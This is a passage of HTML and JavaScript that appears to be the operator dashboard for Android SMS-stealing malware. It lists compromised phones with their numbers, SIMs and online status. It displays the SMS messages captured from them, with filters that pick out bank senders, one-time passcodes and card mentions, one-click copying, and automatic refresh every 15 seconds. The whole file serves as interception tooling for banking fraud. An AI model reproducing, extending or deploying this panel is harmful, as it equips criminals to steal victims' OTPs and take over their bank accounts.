        <div class="stat offline"><div class="label">Offline</div><div class="value">${s.offline}</div></div>
        <div class="stat sms"><div class="label">SMS Today</div><div class="value">${s.sms_today}</div></div>
    `;
}

function renderDevices() {
    const search = (document.getElementById('searchInput')?.value || '').toLowerCase();
    const status = document.getElementById('filterStatus')?.value || 'all';
    
    let list = state.devices;
    if (search) list = list.filter(d => 
        (d.name+'').toLowerCase().includes(search) || 
        (d.number+'').includes(search) || 
        (d.id+'').toLowerCase().includes(search)
    );
    if (status === 'online') list = list.filter(d => d.online);
    if (status === 'offline') list = list.filter(d => !d.online);
    
    const grid = document.getElementById('deviceGrid');
    if (!list.length) {
        grid.innerHTML = '<div class="empty"><div class="icon">📡</div><p>No devices found</p></div>';
        return;
    }
    grid.innerHTML = list.map(d => `
        <div class="device ${d.online?'online':'offline'}" onclick="showDevice('${d.id}')">
            <h3>
                <span class="status-dot ${d.online?'online':'offline'} ${d.online?'pulse-ring':''}"></span>
                ${d.name}
                <span class="badge ${d.online?'online':'offline'}">${d.online?'🟢 ONLINE':'🔴 OFFLINE'}</span>
            </h3>
            <div class="info">
                ${d.number ? '<span>📞 <span class="num">'+d.number+'</span></span>' : ''}
                ${d.country ? '<span>🌍 '+d.country+'</span>' : ''}
                ${d.model ? '<span>📱 '+d.model+'</span>' : ''}
                ${d.lastSeen ? '<span>🕐 '+new Date(d.lastSeen).toLocaleString()+'</span>' : ''}
            </div>
        </div>
    `).join('');
}

function renderDevicesTab() {
    const grid = document.getElementById('deviceGrid2');
    if (!grid) return;
    const s = state.stats;
    document.getElementById('statsDevices').innerHTML = `
        <div class="stat total"><div class="label">Total</div><div class="value">${s.total}</div></div>
        <div class="stat online"><div class="label">Online</div><div class="value">${s.online}</div></div>
        <div class="stat offline"><div class="label">Offline</div><div class="value">${s.offline}</div></div>
    `;
    
    if (!state.devices.length) {
        grid.innerHTML = '<div class="empty"><div class="icon">📡</div><p>No devices connected</p></div>';
        return;
    }
    grid.innerHTML = state.devices.map(d => `
        <div class="device ${d.online?'online':'offline'}" onclick="showDevice('${d.id}')">
            <h3>
                <span class="status-dot ${d.online?'online':'offline'} ${d.online?'pulse-ring':''}"></span>
                ${d.name}
                <span class="badge ${d.online?'online':'offline'}">${d.online?'🟢 ONLINE':'🔴 OFFLINE'}</span>
            </h3>
            <div class="info">
                ${d.number ? '<span>📞 <span class="num">'+d.number+'</span></span>' : ''}
                ${d.country ? '<span>🌍 '+d.country+'</span>' : ''}
                ${d.model ? '<span>📱 '+d.model+'</span>' : ''}
                ${d.lastSeen ? '<span>🕐 '+new Date(d.lastSeen).toLocaleString()+'</span>' : ''}
            </div>
        </div>
    `).join('');
}

function renderSMS() {
    const list = document.getElementById('smsList');
    const filter = state.smsFilter;
    
    let filtered = [...state.sms];
    if (filter === 'today') filtered = filtered.filter(s => s.is_today);
    if (filter === 'bank') filtered = filtered.filter(s => s.bank);
    if (filter === 'otp') filtered = filtered.filter(s => s.otp);
    if (filter === 'card') filtered = filtered.filter(s => detectCard(s.body));
    
    document.getElementById('smsCount').textContent = filtered.length;
    
    if (!filtered.length) {
        list.innerHTML = '<div class="empty"><div class="icon">💬</div><p>No messages found</p></div>';
        return;
    }
    
    list.innerHTML = filtered.map(s => {
        const tags = [];
        if (s.bank) tags.push(`<span class="tag bank">🏦 ${s.bank}</span>`);
        if (s.otp && s.otp.length >= 4) tags.push(`<span class="tag otp">🔑 OTP: ${s.otp}</span>`);
        if (detectCard(s.body).length) tags.push(`<span class="tag card">💳 Card</span>`);
        if (s.is_today) tags.push(`<span class="tag today">📅 Today</span>`);
        
        return `
        <div class="sms-item">
            <div class="head">
                <span class="addr">${s.address || 'Unknown'}</span>
                <span class="date">${s.date ? new Date(s.date).toLocaleString() : ''}</span>
            </div>
            <div class="body">${escapeHtml(s.body)}</div>
            <div class="tags">${tags.join('')}</div>
            <button class="copy" onclick="copyText('${escapeHtml(s.body).replace(/'/g,"\\'")}')">Copy</button>
        </div>`;
    }).join('');
}

function detectCard(msg) {
    const cards = [];
    if (/credit|debit|master|visa|card|atm/i.test(msg)) cards.push(true);
    return cards;
}

function filterSMS(filter, btn) {
    state.smsFilter = filter;
    document.querySelectorAll('.sms-filters button').forEach(b => b.classList.remove('active'));
    if (btn) btn.classList.add('active');
    renderSMS();
}

function filterData() {
    renderDevices();
    renderSMS();
}

// ─── Device Detail Modal ──────────────────────────────────────────────
async function showDevice(did) {
    const d = state.devices.find(x => x.id === did);
    if (!d) return;
    
    document.getElementById('modalTitle').textContent = `📱 ${d.name}`;
    
    document.getElementById('modalDetails').innerHTML = `
        <div class="item full"><div class="lbl">Device ID</div><div class="val copyable" onclick="copyText('${d.id}')">${d.id}</div></div>
        ${d.number ? `<div class="item"><div class="lbl">Number</div><div class="val copyable" onclick="copyText('${d.number}')">${d.number}</div></div>` : ''}
        <div class="item"><div class="lbl">Status</div><div class="val" style="color:${d.online?'#22c55e':'#666'}">${d.online?'● ONLINE':'○ OFFLINE'}</div></div>
        ${d.country ? `<div class="item"><div class="lbl">Country</div><div class="val">${d.country}</div></div>` : ''}
        ${d.model ? `<div class="item"><div class="lbl">Model</div><div class="val">${d.model}</div></div>` : ''}
        ${d.android ? `<div class="item"><div class="lbl">Android</div><div class="val">${d.android}</div></div>` : ''}
        ${d.lastSeen ? `<div class="item full"><div class="lbl">Last Seen</div><div class="val">${new Date(d.lastSeen).toLocaleString()}</div></div>` : ''}
    `;
    
    // SIMs
    const sims = d.sims || [];
    if (d.number && !sims.length) sims.push({number: d.number, carrier: ''});
    document.getElementById('modalSims').innerHTML = sims.length 
        ? sims.map(s => `
            <div class="sim">
                <span class="num" onclick="copyText('${s.number||s}')">📞 ${s.number||s}</span>
                <span class="carrier">${s.carrier||s.operator||''}</span>
            </div>
        `).join('')
        : '<div style="color:var(--muted);font-size:13px;padding:10px">No SIM data</div>';
    
    // Device SMS
    document.getElementById('modalSms').innerHTML = '<div class="loading"><div class="spinner"></div></div>';
    document.getElementById('deviceModal').classList.add('open');
    
    try {
        const acct = getCurrent();
        if (!acct) return;
        const res = await fetch(`?action=device_sms&did=${encodeURIComponent(did)}&fb=${encodeURIComponent(acct.url)}&key=${encodeURIComponent(acct.key)}`);
        const smsList = await res.json();
        
        document.getElementById('modalSms').innerHTML = smsList.length 
            ? smsList.map(s => `
                <div class="sms-item">
                    <div class="head">
                        <span class="addr">${s.address || 'Unknown'}</span>
                        <span class="date">${s.date ? new Date(s.date).toLocaleString() : ''}</span>
                    </div>
                    <div class="body">${escapeHtml(s.body)}</div>
                    ${s.bank ? `<div class="tags"><span class="tag bank">🏦 ${s.bank}</span></div>` : ''}
                    <button class="copy" onclick="copyText('${escapeHtml(s.body).replace(/'/g,"\\'")}')">Copy</button>
                </div>
            `).join('')
            : '<div class="empty"><div class="icon">💬</div><p>No SMS for this device</p></div>';
    } catch(e) {
        document.getElementById('modalSms').innerHTML = '<div class="empty"><div class="icon">⚠️</div><p>Failed to load SMS</p></div>';
    }
}

function closeModal() {
    document.getElementById('deviceModal').classList.remove('open');
}

// ─── Tab Switching ────────────────────────────────────────────────────
function showTab(tab) {
    document.querySelectorAll('.nav a').forEach(a => a.classList.remove('active'));
    document.querySelectorAll('.main > div[id^="tab-"]').forEach(d => d.style.display = 'none');
    document.getElementById('tab-' + tab).style.display = 'block';
    document.querySelector(`.nav a[onclick*="'${tab}'"]`)?.classList.add('active');
    
    if (tab === 'devices') renderDevicesTab();
    if (tab === 'sms') renderSMS();
}

// ─── Utilities ────────────────────────────────────────────────────────
function escapeHtml(text) {
    const d = document.createElement('div');
    d.textContent = text;
    return d.innerHTML;
}

function copyText(text) {
    navigator.clipboard.writeText(text).then(() => {
        showToast('Copied!', 'success');
    }).catch(() => {
        // Fallback
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        ta.remove();
        showToast('Copied!', 'success');
    });
}

let toastTimeout;

function showToast(msg, type='info') {
    const existing = document.querySelector('.toast');
    if (existing) existing.remove();
    clearTimeout(toastTimeout);
    const t = document.createElement('div');
    t.className = 'toast ' + type;
    t.textContent = msg;
    document.body.appendChild(t);
    toastTimeout = setTimeout(() => t.remove(), 3000);
}

function logout() {
    if (!confirm('Logout?')) return;
    document.cookie = 'PHPSESSID=;expires=Thu,01 Jan 1970 00:00:00 GMT;path=/';
    location.reload();
}

// ─── Auto-refresh ─────────────────────────────────────────────────────
// ─── Init ──────────────────────────────────────────────────────────────
renderAccounts();
if (getCurrent()) loadData();
else renderAll();

// Auto-refresh every 15 seconds
setInterval(() => { if (getCurrent() && !document.hidden) loadData(); }, 15000);
</script>
</body>
</html>
